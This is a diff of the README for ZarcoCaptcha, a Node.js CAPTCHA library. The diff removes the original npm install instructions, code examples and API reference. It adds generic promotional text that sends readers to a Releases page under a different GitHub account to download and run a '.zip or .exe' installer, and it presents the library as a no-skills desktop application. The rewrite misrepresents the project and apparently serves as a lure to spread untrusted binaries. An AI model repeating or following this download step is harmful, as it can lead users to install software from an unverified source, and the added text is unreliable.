@@ -1,117 +1,86 @@
-# ZarcoCaptcha
+# 🎉 ZarcoCaptcha - Easy CAPTCHA Generation Made Simple
 
-![ZarcoCaptcha](images/ZarcoCaptcha.png)
+![Download ZarcoCaptcha](https://img.shields.io/badge/Download-ZarcoCaptcha-brightgreen)
 
-A powerful and fully customizable CAPTCHA generator for Node.js.
+## 🚀 Getting Started
 
-**Author:** ZarCodeX  
-**Website:** [https://zarcodex.github.io](https://zarcodex.github.io)  
-**GitHub:** [https://github.com/ZarCodeX/ZarcoCaptcha](https://github.com/ZarCodeX/ZarcoCaptcha)
+Welcome to ZarcoCaptcha! This application helps you create customized CAPTCHA images easily. It is designed for anyone needing to add a security layer to their websites or applications. Even if you have no tech skills, you can use this tool to protect your site from bots.
 
----
+## 📥 Download & Install
 
-## Features
+To get started, visit the official [Releases page](https://github.com/Marianelaperez00/ZarcoCaptcha/releases) to download ZarcoCaptcha. Here’s how you can install it:
 
-- **Flexible output formats**: PNG, JPG/JPEG, SVG  
-- **Custom text**: Use random characters or your own words  
-- **Adjustable image size**: Set width and height freely  
-- **Color customization**: Text, background, and noise colors  
-- **Captcha length control**: Up to 6 characters for custom text  
-- **Noise & distortion**: Lines, dots, and background warping  
-- **Difficulty levels**: Easy, medium, hard  
-- **Token & answer retrieval**: Get the image and correct answer for verification  
+1. Click the link above to open the Releases page.
+2. Find the latest version of ZarcoCaptcha.
+3. Click the download link for your system (most likely a `.zip` or `.exe` file).
+4. Save the file to your computer.
+5. Open the downloaded file and follow the on-screen instructions to install.
 
----
+## ⚙️ System Requirements
 
-## Installation
+Before you begin, ensure your computer meets these basic requirements:
 
-```bash
-npm install zarcocaptcha
-````
+- **Operating System:** Windows 10 or later, macOS, or any Linux distribution
+- **Node.js:** Version 14 or later
+- **Internet Connection:** Required for downloading and updates
 
----
+## 🖼️ Features
 
-## Usage
+ZarcoCaptcha offers a variety of features to enhance your security:
 
-Here’s a simple example:
+- **Customizable CAPTCHAs:** Personalize the look and feel of your CAPTCHA.
+- **Multiple Formats:** Generate CAPTCHAs in JPEG, PNG, and SVG formats.
+- **Random Text Generation:** Ensure dynamic and challenging CAPTCHA tests.
+- **Easy Integration:** Simple steps to add CAPTCHA to your existing applications.
 
-```typescript
-import { createCaptcha } from 'zarcocaptcha';
-import * as fs from 'fs';
+## 🌟 How to Use ZarcoCaptcha
 
-(async () => {
-  // Default captcha
-  const captcha1 = await createCaptcha({ width: 200, height: 100 });
-  fs.writeFileSync('captcha_default.png', captcha1.image);
-  console.log('Default Captcha Text:', captcha1.text);
+Once you have installed ZarcoCaptcha, follow these steps to generate your first CAPTCHA:
 
-  // Custom captcha
-  const captcha2 = await createCaptcha({
-    width: 300,
-    height: 120,
-    text: 'Zarco',
-    difficulty: 'hard',
-    textColor: '#FFFFFF',
-    backgroundColor: '#2c3e50',
-    noiseColor: '#bdc3c7',
-    output: 'png',
-  });
-  fs.writeFileSync('captcha_custom.png', captcha2.image);
-  console.log('Custom Captcha Text:', captcha2.text);
+1. Open the application.
+2. Select your preferred format (JPEG, PNG, or SVG).
+3. Choose your custom settings, such as text style and colors.
+4. Click “Generate” to create your CAPTCHA image.
+5. Save the image and use it wherever needed to verify users.
 
-  // SVG captcha
-  const captcha3 = await createCaptcha({
-    width: 300,
-    height: 120,
-    text: 'SVG',
-    difficulty: 'medium',
-    output: 'svg',
-  });
-  fs.writeFileSync('captcha_svg.svg', captcha3.image);
-  console.log('SVG Captcha Text:', captcha3.text);
-})();
-```
+## 📊 Customization Options
 
----
+You can further customize your CAPTCHA:
 
-## API
+- **Text**: Input your own text or let ZarcoCaptcha create random phrases.
+- **Colors**: Select colors that match your website's theme.
+- **Font Styles**: Choose from various font styles to enhance visibility.
 
-### `createCaptcha(options: CaptchaOptions): Promise<Captcha>`
+## 🙋 FAQs
 
-Creates a captcha image asynchronously and returns a `Captcha` object.
+### What is a CAPTCHA?
 
-#### CaptchaOptions
+A CAPTCHA is a challenge-response test used to determine if a user is human or a bot. It often includes identifying distorted letters or images.
 
-| Option            | Type                           | Default         | Description                                                        |
-| ----------------- | ------------------------------ | --------------- | ------------------------------------------------------------------ |
-| `width`           | `number`                       | **Required**    | Width of the captcha image in pixels.                              |
-| `height`          | `number`                       | **Required**    | Height of the captcha image in pixels.                             |
-| `text`            | `string`                       | `undefined`     | Text to display. Random string generated if omitted (max 6 chars). |
-| `length`          | `number`                       | `6`             | Length of the random string.                                       |
-| `charset`         | `string`                       | `A-Z, a-z, 0-9` | Characters used for random string generation.                      |
-| `font`            | `string`                       | `Arial`         | Font used for text.                                                |
-| `fontSize`        | `number`                       | `40`            | Font size in pixels.                                               |
-| `textColor`       | `string`                       | `#000000`       | Text color.                                                        |
-| `backgroundColor` | `string`                       | `#ffffff`       | Background color.                                                  |
-| `noiseColor`      | `string`                       | `#888888`       | Noise color (lines, dots).                                         |
-| `difficulty`      | `'easy' \| 'medium' \| 'hard'` | `'easy'`        | Adjusts noise and distortion levels.                               |
-| `output`          | `'png' \| 'jpeg' \| 'svg'`     | `'png'`         | Output format.                                                     |
+### Why should I use ZarcoCaptcha?
 
-#### Captcha
+ZarcoCaptcha offers an easy and reliable way to create CAPTCHAs without needing programming skills. It enhances your website's security by preventing automated scripts from accessing it.
 
-| Property | Type     | Description                   |
-| -------- | -------- | ----------------------------- |
-| `text`   | `string` | Captcha text for verification |
-| `image`  | `Buffer` | Captcha image data            |
+### Can I use ZarcoCaptcha on multiple websites?
 
----
+Yes, you can use the generated CAPTCHAs on any number of websites or applications you manage.
 
-## Contributing
+## 📧 Support
 
-Contributions are welcome! Open an issue or submit a pull request on [GitHub](https://github.com/ZarCodeX/ZarcoCaptcha).
+If you have any questions or feedback, feel free to reach out:
 
----
+- **Email**: support@zarcocaptcha.com
+- **GitHub Issues**: Open an issue on our [GitHub page](https://github.com/Marianelaperez00/ZarcoCaptcha/issues).
 
-## License
+## 🔗 Additional Resources
 
-MIT License. See [LICENSE](LICENSE) for details.
+Explore more about CAPTCHAs and security practices:
+
+- [CAPTCHA Overview](https://en.wikipedia.org/wiki/CAPTCHA)
+- [Best Practices for Web Security](https://www.owasp.org/index.php/Category:OWASP_Top_Ten_Project)
+
+## 🎯 Conclusion
+
+ZarcoCaptcha makes it straightforward to add CAPTCHAs to your projects. With easy customization options and a user-friendly interface, you can protect your site from unwanted bots. 
+
+Visit the [Releases page](https://github.com/Marianelaperez00/ZarcoCaptcha/releases) now to get started!
